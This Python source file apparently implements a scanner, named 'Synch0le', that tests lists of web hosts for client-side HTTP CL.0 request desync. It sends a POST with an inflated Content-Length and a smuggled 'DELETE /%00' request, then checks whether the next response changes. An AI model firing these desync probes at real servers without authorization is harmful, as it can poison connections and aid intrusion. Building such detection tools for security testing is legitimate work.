import argparse
import asyncio
import concurrent
import socket
import ssl
from urllib.parse import urlparse

import aiohttp
from colorama import Fore, Style
from prettytable import PrettyTable
from pyfiglet import Figlet

f = Figlet(font='epic')
print(f.renderText('Synch0le'))

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)
executor = concurrent.futures.ThreadPoolExecutor(max_workers=16)
timeout_seconds = 6
session_timeout = aiohttp.ClientTimeout(total=None, sock_connect=timeout_seconds, sock_read=timeout_seconds)


def check_http2(domain_name):
    try:
        HOST = urlparse(domain_name).netloc
        PORT = 443
        ctx = ssl.create_default_context()
        ctx.set_alpn_protocols(['h2', 'spdy/3', 'http/1.1'])
        conn = ctx.wrap_socket(
            socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=HOST)
        conn.connect((HOST, PORT))
        pp = conn.selected_alpn_protocol()
        if pp == "h2":
            return {"http2": True}
        else:
            return {"http2": False}
    except Exception as e:
        # print(repr(e))
        return


async def individual_request(loop, executor, target):
    target = target.strip()
    if "http" not in target:
        target = "https://" + target
    try:
        h2_supported = False
        this_server = ""
        this_code = 0
        reusable_conn1 = aiohttp.TCPConnector(keepalive_timeout=900, ssl=False)
        async with aiohttp.ClientSession(timeout=session_timeout, connector=reusable_conn1) as session:
            # Make the first request to a server. This will be a HTTP GET, to ensure 
            # the page is live, grab the banner and then check if the server supports HTTP 2 or not.
            async with session.get(target, allow_redirects=False, timeout=6) as response:
                # print(f"Response HTTP code: {response.status} on {target} to GET /")
                this_server = response.headers["Server"]
                this_version = response.version
                this_code = response.status

                h2_supported = check_http2(target)
                if h2_supported["http2"] == True:
                    # print(f"[X] Abandoning host {target} as it supports H2")
                    return ("failed", "failed", this_code)
                else:
                    print(f"[+] {target} does not support HTTP/2")

                if not this_server:
                    this_server = response.headers["X-Powered-By"]
                    if not this_server:
                        this_server = response.headers["Via"]

                if this_server:
                    this_server = this_server.strip()
                    print(f"[+] {target} uses {this_server}")
                else:
                    this_server = "Unknown"

            # Now send a POST request somewhere unexpected like /favicon.ico, with an exaggerated CL
            # If the server responds to this straight away, it might be ignoring CL
        reusable_conn = aiohttp.TCPConnector(keepalive_timeout=900, ssl=False)
        async with aiohttp.ClientSession(timeout=900, connector=reusable_conn, headers={
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36"}) as session:
            try:
                # print(f"[?] Testing {target} for CL ignorance")
                body = f"""\r\nDELETE /%00 HTTP/1.1
X: Y"""
                con_len = len(body)
                async with session.post(target + "/favicon.ico", allow_redirects=False, timeout=10, data=body,
                                        skip_auto_headers=["Content-Length"],
                                        headers={"Content-Length": str(con_len + 1)}) as response_mid:
                    # print(f"Response HTTP code: {response_mid.status} on {target} to wrong CL")
                    async with session.get(target, allow_redirects=False, timeout=6) as further_response:
                        # Check if the first request affected the second response code
                        # print(f"Response HTTP code: {further_response.status} on {target} to GET /")
                        success = False
                        if further_response.status != this_code:
                            # Success, the first response poisoned the connection
                            # print(f"\n[+] Success! The host {target} appears to be vulnerable to CSD.")
                            print(
                                f"{Fore.GREEN}[!!!] Successful Client Side Desync: {this_code} --> {response_mid.status} --> {further_response.status} on host {target}{Style.RESET_ALL}")
                            success = True
                        return (target, this_server, this_code, success)
            except Exception as e:
                if repr(e) != "TimeoutError()":
                    # print(repr(e))
                    return (target, "Unable to detect platform")
    except Exception as e:
        if repr(e) != "KeyError('Server')" and repr(
                e) != "TypeError(\"'NoneType' object is not subscriptable\")" and repr(e) != "TimeoutError()":
            # print(repr(e))
            return (target, "Unable to detect platform")
    return (target, this_server, this_code)


async def main(urls):
    coroutines = [individual_request(loop, executor, url) for url in urls]
    results = await asyncio.gather(*coroutines)
    return results


def quick_stats(results):
    stats_dict = {}
    platform_set = set()
    for item in results:
        temp = item[1]
        if temp != "Unable to detect platform":
            if temp not in platform_set:
                platform_set.add(temp)
                stats_dict[temp] = 1
            else:
                stats_dict[temp] += 1

    print_stats_table(results, platform_set)


def print_stats_table(results, platform_set):
    x = PrettyTable()
    x.field_names = ["Platform", "De-Synced Host", "HTTP Code"]

    # I know this is horrible
    for item in platform_set:
        for entry in results:
            if entry[1] == item:
                x.add_row([entry[1], entry[0], entry[2]])

    x.align = "l"
    print("\n")
    print(x)


parser = argparse.ArgumentParser(description="Test hosts for Client-Side HTTP CL.0 De-Synchronisation",
                                 formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-t", "--targets", help="Input file list of FQDN like https://example.com")
parser.add_argument("-o", "--oneshot", help="A single FQDN to visit")
args = parser.parse_args()
server_list = []

if args.targets:
    with open(args.targets, 'r') as targetfile:
        targetlist = targetfile.readlines()
        server_list = loop.run_until_complete((main(targetlist)))

elif args.oneshot:
    server_list = loop.run_until_complete((main([args.oneshot])))
else:
    parser.print_help()
    exit()

num_success = 0
valid_list = []
for server in server_list:
    if server and len(server) > 3:
        if server[1] != "Unable to detect platform" and server[0] != "failed" and server[3]:
            num_success += 1
            valid_list.append(server)
quick_stats(valid_list)
if not args.oneshot:
    print(f"Detected {num_success} potentially vulnerable hosts out of {len(targetlist)} Hosts.")
